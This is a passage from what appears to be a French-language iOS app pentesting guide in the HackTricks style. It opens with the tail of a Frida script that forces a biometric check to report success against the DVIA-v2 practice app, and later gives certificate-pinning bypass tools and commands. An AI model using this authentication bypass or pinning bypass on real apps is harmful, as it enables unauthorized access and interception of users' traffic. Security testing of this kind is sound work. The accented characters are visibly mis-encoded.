var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposition de Fonctionnalit√©s Sensibles √† travers l'IPC

### Gestionnaires d'URI personnalis√©s / Deeplinks / Sch√©mas personnalis√©s

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Liens Universels

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Partage UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extensions d'Application

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### S√©rialisation et Encodage

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Communication R√©seau

Il est important de v√©rifier qu'aucune communication ne se produit **sans chiffrement** et aussi que l'application valide correctement **le certificat TLS** du serveur.\
Pour v√©rifier ces probl√®mes, vous pouvez utiliser un proxy comme **Burp** :

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### V√©rification du nom d'h√¥te

Un probl√®me courant lors de la validation du certificat TLS est de v√©rifier que le certificat a √©t√© sign√© par une **CA de confiance**, mais de **ne pas v√©rifier** si **le nom d'h√¥te** du certificat est le nom d'h√¥te acc√©d√©.\
Pour v√©rifier ce probl√®me en utilisant Burp, apr√®s avoir fait confiance au CA de Burp sur l'iPhone, vous pouvez **cr√©er un nouveau certificat avec Burp pour un nom d'h√¥te diff√©rent** et l'utiliser. Si l'application fonctionne toujours, alors, quelque chose est vuln√©rable.

### Pinning de Certificat

Si une application utilise correctement le Pinning SSL, alors l'application ne fonctionnera que si le certificat est celui attendu. Lors du test d'une application **cela peut √™tre un probl√®me car Burp servira son propre certificat.**\
Pour contourner cette protection sur un appareil jailbreak√©, vous pouvez installer l'application [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ou installer [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Vous pouvez √©galement utiliser `ios sslpinning disable` de **objection**.

## Divers

* Dans **`/System/Library`** vous pouvez trouver les frameworks install√©s dans le t√©l√©phone utilis√©s par les applications syst√®me.
* Les applications install√©es par l'utilisateur depuis l'App Store se trouvent dans **`/User/Applications`**.
* Et **`/User/Library`** contient les donn√©es enregistr√©es par les applications au niveau utilisateur.
* Vous pouvez acc√©der √† **`/User/Library/Notes/notes.sqlite`** pour lire les notes enregistr√©es dans l'application.
* √Ä l'int√©rieur du dossier d'une application install√©e (**`/User/Applications/<APP ID>/`**), vous pouvez trouver des fichiers int√©ressants :
  * **`iTunesArtwork`** : L'ic√¥ne utilis√©e par l'application.
  * **`iTunesMetadata.plist`** : Infos de l'application utilis√©es dans l'App Store.
  * **`/Library/*`** : Contient les pr√©f√©rences et le cache. Dans **`/Library/Cache/Snapshots/*`** vous pouvez trouver la capture d'√©cran effectu√©e √† l'application avant de l'envoyer en arri√®re-plan.

### Patching √† Chaud/Mise √† Jour Forc√©e

Les d√©veloppeurs peuvent **patcher √† distance toutes les installations de leur application instantan√©ment** sans avoir √† soumettre √† nouveau l'application √† l'App store et attendre qu'elle soit approuv√©e.\
Pour cela, on utilise g√©n√©ralement [**JSPatch**](https://github.com/bang590/JSPatch). Mais il existe aussi d'autres options telles que [Siren](https://github.com/ArtSabintsev/Siren) et [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**C'est un m√©canisme dangereux qui pourrait √™tre abus√© par des SDK tiers malveillants, il est donc recommand√© de v√©rifier quelle m√©thode est utilis√©e pour la mise √† jour automatique (le cas √©ch√©ant) et de la tester.** Vous pourriez essayer de t√©l√©charger une version ant√©rieure de l'application √† cette fin.

### Tiers

Un probl√®me des SDK tiers est qu'il n'y a **pas de contr√¥le granulaire sur les fonctionnalit√©s offertes par le SDK**. Vous pourriez utiliser le SDK et avoir toutes les fonctionnalit√©s (y compris les fuites de diagnostic et les connexions HTTP non s√©curis√©es), ou ne pas l'utiliser. De plus, il n'est g√©n√©ralement pas possible pour les d√©veloppeurs d'applications de **corriger une vuln√©rabilit√©** sur le SDK.\
De plus, certains SDK commencent √† **contenir des logiciels malveillants une fois qu'ils sont tr√®s fiables** par la communaut√©.

En outre, les fonctionnalit√©s fournies par ces services peuvent impliquer des **services de suivi pour surveiller le comportement de l'utilisateur** lors de l'utilisation de l'application, la vente de publicit√©s sur banni√®res ou l'am√©lioration de l'exp√©rience utilisateur. L'inconv√©nient des services tiers est que les d√©veloppeurs ne connaissent pas les d√©tails du code ex√©cut√© via des biblioth√®ques tierces. Par cons√©quent, aucune information plus que n√©cessaire ne doit √™tre envoy√©e √† un service, et aucune information sensible ne doit √™tre divulgu√©e.

L'inconv√©nient est qu'un **d√©veloppeur ne conna√Æt pas en d√©tail quel code est ex√©cut√© via des biblioth√®ques tierces** et par cons√©quent renonce √† la visibilit√©. Par cons√©quent, il faut s'assurer que pas plus d'informations que n√©cessaire sont envoy√©es au service et qu'aucune information sensible n'est divulgu√©e.

La plupart des services tiers sont impl√©ment√©s de deux mani√®res :

* avec une biblioth√®que autonome
* avec un SDK complet

Toutes les donn√©es envoy√©es aux services tiers doivent √™tre anonymis√©es pour √©viter l'exposition de PII (Personal Identifiable Information) qui permettrait au tiers d'identifier le compte utilisateur.

Vous pouvez trouver les **biblioth√®ques utilis√©es par une application** en ex√©cutant **`otool`** contre l'application (et **l'ex√©cutant** **contre** **chaque** biblioth√®que partag√©e pour trouver plus de biblioth√®ques partag√©es utilis√©es).

## **R√©f√©rences**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)

## Plus d'Informations

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Cours gratuit IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Version Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Version Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** aliment√©s par les outils communautaires **les plus avanc√©s**.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
